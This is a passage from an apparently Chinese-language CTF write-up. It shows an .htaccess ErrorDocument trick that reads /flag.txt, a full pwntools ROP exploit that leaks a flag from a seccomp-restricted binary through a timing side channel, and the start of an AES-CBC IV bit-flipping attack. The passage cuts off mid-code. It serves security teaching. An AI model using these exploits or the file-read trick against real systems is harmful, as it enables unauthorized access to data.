</span></span></code></pre></td></tr></table></div></div><p>後來得知這題其實很簡單就可以拿到 flag 了…</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#75715e># .htaccess</span>
</span></span><span style=display:flex><span>ErrorDocument <span style=color:#ae81ff>403</span> %{file:/flag.txt}
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=pwn>pwn</h2><h3 id=how2know_revenge>how2know_revenge</h3><p>原題的 source code:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;seccomp.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> addr[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> fd;
</span></span><span style=display:flex><span>    scmp_filter_ctx ctx;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/home/chal/flag&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;open&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>read</span>(fd, flag, <span style=color:#ae81ff>0x30</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;talk is cheap, show me the rop</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>31</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, addr, <span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ctx <span style=color:#f92672>=</span> <span style=color:#a6e22e>seccomp_init</span>(SCMP_ACT_KILL);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span style=color:#a6e22e>SCMP_SYS</span>(exit), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span style=color:#a6e22e>SCMP_SYS</span>(exit_group), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>seccomp_load</span>(ctx);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>seccomp_release</span>(ctx);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>跟作業一樣被禁用了幾乎所有 syscall。<br>作業的 how2know 是用 infinite loop 讓我們可以每次分辨出一個 bit，這題只差在說作業會執行我們自己寫的 shell code 而這題只有 buffer overflow，而且有開 NX。不過是 static linked 所以 ROP gadget 和 main/flag 的 address 都直接抓得到。</p><p>剩下來的問題就是用 ROP chain 寫一個 while loop 還有 conditional jmp 了。</p><p>註：得到 ROP address 可以用 pwntools 附的 <code>ROPgadget</code> 這個指令</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ROPgadget --multibr --binary share/chal | fzf
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> func_timeout
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;wezterm&#39;</span>, <span style=color:#e6db74>&#39;start&#39;</span>]
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;error&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = gdb.debug(&#39;share/chal&#39;, &#39;break main&#39;)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process(&#39;share/chal&#39;) #, aslr=False)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># gdb.attach(r)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>main_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401cb5</span>
</span></span><span style=display:flex><span>flag_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4de2e0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000458237</span> <span style=color:#75715e># : pop rax ; ret</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000402798</span> <span style=color:#75715e># : pop rsi ; ret</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401812</span> <span style=color:#75715e># : pop rdi ; ret</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040171f</span> <span style=color:#75715e># : pop rdx ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>push_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000412b46</span> <span style=color:#75715e># : push rsi ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gogo</span>(N, OFFSET):
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;edu-ctf.zoolab.org&#39;</span>, <span style=color:#ae81ff>10012</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># r = process(&#39;share/chal&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ROP <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>            pop_rdx_ret, N,
</span></span><span style=display:flex><span>            pop_rax_ret, flag_addr <span style=color:#f92672>+</span> OFFSET,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ae81ff>0x0000000000438c36</span>, <span style=color:#75715e># : cmp byte ptr [rax], dl ; ret</span>
</span></span><span style=display:flex><span>            <span style=color:#ae81ff>0x0000000000493f6e</span>, <span style=color:#75715e># : jle 0x494010 ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># 0x000000000048d0df, # : cmp rax, -3 ; jbe 0x48d0f0 ; ret</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># 0x0000000000402ed9, # : cmp eax, 0xd922a ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># infinite loop</span>
</span></span><span style=display:flex><span>            pop_rsi_ret, push_rsi_ret,
</span></span><span style=display:flex><span>            push_rsi_ret,
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(len(ROP))</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> cyclic(<span style=color:#ae81ff>0x28</span>) <span style=color:#f92672>+</span> ROP
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@func_timeout.func_set_timeout</span>(<span style=color:#ae81ff>0.5</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wait</span>():
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>recvall()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        wait()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> func_timeout<span style=color:#f92672>.</span>exceptions<span style=color:#f92672>.</span>FunctionTimedOut:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(gogo(ord(&#39;F&#39;), 0))</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(gogo(ord(&#39;F&#39;) - 1, 0))</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(gogo(ord(&#39;L&#39;), 1))</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(gogo(ord(&#39;L&#39;) - 1, 1))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    L <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>    R <span style=color:#f92672>=</span> <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> R <span style=color:#f92672>-</span> L <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        M <span style=color:#f92672>=</span> (L <span style=color:#f92672>+</span> R) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> gogo(M, i):
</span></span><span style=display:flex><span>            R <span style=color:#f92672>=</span> M
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            L <span style=color:#f92672>=</span> M
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>+=</span> chr(R)
</span></span><span style=display:flex><span>    print(ans)
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=crypto>crypto</h2><h3 id=hex>HEX</h3><p>題目</p><blockquote><p>一開始會生成 一個 8 byte 的 token 以及各 16 byte 的 iv、key，並且給我們用 AES CBC 加密 token.hex() 過後的結果。<br>猜中這個 token 就可以得到 flag。<br>我們可以詢問多次用「任意 iv」和原本的 key 解密「任意訊息」，並且得知這個訊息是不是一個 hex string，但要注意如果沒辦法從 bytes decode 回 str 就會直接斷線。</p></blockquote><p>error-based 的 bit-flipping attack 的感覺。根據 AES CBC 的特性，對 iv 的一個 byte xor 某個值等於對解密過後對應的 byte xor 那個值（iv 只會影響第一個 block，每個 block 應該是 16 bytes），所以我們就試著看 token.hex() 的特定一個字元 XOR 哪些數字還會是 <code>[0-9A-Fa-f]</code>。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
